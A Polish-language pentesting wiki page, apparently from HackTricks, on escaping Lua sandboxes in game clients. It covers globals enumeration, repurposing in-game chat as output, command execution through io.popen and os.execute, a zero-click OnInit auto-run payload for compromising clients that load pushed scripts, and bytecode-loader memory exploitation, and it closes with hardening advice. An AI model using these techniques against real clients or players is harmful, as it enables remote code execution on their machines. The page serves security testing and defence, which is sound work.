# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ta strona zawiera praktyczne techniki enumeracji i wydostawania się z „sandboxów” Lua osadzonych w aplikacjach (szczególnie game clients, pluginach lub silnikach skryptowych w aplikacjach). Wiele silników udostępnia ograniczone środowisko Lua, ale pozostawia dostęp do niebezpiecznych globalnych obiektów, które umożliwiają wykonywanie dowolnych poleceń, a nawet natywne uszkodzenie pamięci, gdy dostępne są loadery bytecode.

Najważniejsze idee:
- Traktuj VM jako nieznane środowisko: przeprowadź enumerację _G i sprawdź, jakie niebezpieczne prymitywy są dostępne.
- Gdy stdout/print jest zablokowane, wykorzystaj dowolny kanał UI/IPC dostępny w VM jako ujście danych, aby obserwować wyniki.
- Jeśli io/os jest dostępne, często uzyskujesz bezpośrednie wykonywanie poleceń (io.popen, os.execute).
- Jeśli dostępne są load/loadstring/loadfile, wykonywanie spreparowanego Lua bytecode może w niektórych wersjach obejść memory safety (weryfikatory ≤5.1 można obejść; w 5.2 weryfikator usunięto), umożliwiając zaawansowaną eksploatację.

## Enumeracja sandboxowanego środowiska

- Zrzut globalnego środowiska w celu zinwentaryzowania dostępnych tabel/funkcji:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Jeśli funkcja print() nie jest dostępna, wykorzystaj ponownie kanały dostępne w VM. Przykład z VM skryptu systemu urządzania mieszkań w grze MMO, w którym wyjście czatu działa dopiero po wywołaniu dźwięku; poniższy kod tworzy niezawodną funkcję wyjścia:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Uogólnij ten wzorzec dla swojego celu: dowolny textbox, toast, logger lub callback UI, który akceptuje stringi, może pełnić funkcję stdout na potrzeby reconnaissance.

## Bezpośrednie wykonywanie poleceń, jeśli io/os są exposed

Jeśli sandbox nadal udostępnia standardowe biblioteki io lub os, prawdopodobnie masz natychmiastowe wykonywanie poleceń:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Uwagi:

- Wykonanie odbywa się wewnątrz procesu klienta; wiele warstw anti-cheat/antidebug, które blokują zewnętrzne debugery, nie zapobiegnie tworzeniu procesów w VM.
- Sprawdź również: package.loadlib (ładowanie dowolnych bibliotek DLL/.so), require z native modules, ffi w LuaJIT (jeśli jest dostępne) oraz debug library (może podnosić uprawnienia wewnątrz VM).

## Wyzwalacze zero-click za pośrednictwem callbacków auto-run

Jeśli aplikacja hosta wysyła skrypty do klientów, a VM udostępnia hooki auto-run (np. OnInit/OnLoad/OnEnter), umieść tam swój payload, aby doprowadzić do drive-by compromise natychmiast po załadowaniu skryptu:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Każdy równoważny callback (OnLoad, OnEnter itd.) uogólnia tę technikę, gdy skrypty są automatycznie przesyłane i wykonywane po stronie klienta.

## Niebezpieczne primitives do wyszukania podczas recon

Podczas enumeracji _G szukaj w szczególności:
- io, os: io.popen, os.execute, operacje na plikach, dostęp do env.
- load, loadstring, loadfile, dofile: wykonują source lub bytecode; obsługują ładowanie niezaufanego bytecode.
- package, package.loadlib, require: ładowanie bibliotek dynamicznych i powierzchnia modułów.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo oraz hooks.
- Tylko LuaJIT: ffi.cdef, ffi.load do bezpośredniego wywoływania native code.

Minimalne przykłady użycia (jeśli są dostępne):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opcjonalna eskalacja: nadużywanie loaderów Lua bytecode

Gdy load/loadstring/loadfile są dostępne, ale io/os są ograniczone, wykonanie spreparowanego Lua bytecode może prowadzić do uzyskania prymitywów ujawniania i uszkadzania pamięci. Kluczowe fakty:
- Lua ≤ 5.1 zawierało verifier bytecode, dla którego znane są bypasses.<sup>[[4]](#references)</sup>
- Lua 5.2 całkowicie usunęło verifier (oficjalne stanowisko: aplikacje powinny po prostu odrzucać precompiled chunks), zwiększając attack surface, jeśli ładowanie bytecode nie jest zabronione.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows zazwyczaj obejmują: leak pointerów za pośrednictwem outputu w VM, spreparowanie bytecode w celu utworzenia type confusions (np. wokół FORLOOP lub innych opcodes), a następnie przejście do arbitrary read/write lub native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Ta ścieżka jest zależna od engine/version i wymaga RE. Zobacz references, aby zapoznać się z dokładnymi analizami, exploitation primitives oraz przykładami gadgetry w games.

## Uwagi dotyczące wykrywania i hardeningu (dla defenderów)

- Po stronie servera: odrzucaj lub przepisuj user scripts; stosuj allowlist bezpiecznych API; usuń albo powiąż z pustymi implementacjami io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Po stronie clienta: uruchamiaj Lua z minimalnym _ENV, zabroń ładowania bytecode, przywróć strict bytecode verifier lub signature checks i zablokuj tworzenie procesów z procesu klienta.
- Telemetria: generuj alert na utworzenie procesu potomnego przez gameclient wkrótce po załadowaniu scriptu; koreluj to ze zdarzeniami UI/chat/script.

## References

- [1] [Ten dom jest nawiedzony: dekadę stary RCE w kliencie AION (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: analiza luk bezpieczeństwa Lua w Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): dyskusja na temat usunięcia bytecode verifiera](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist z bypasses/notes dotyczącymi verifiera)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
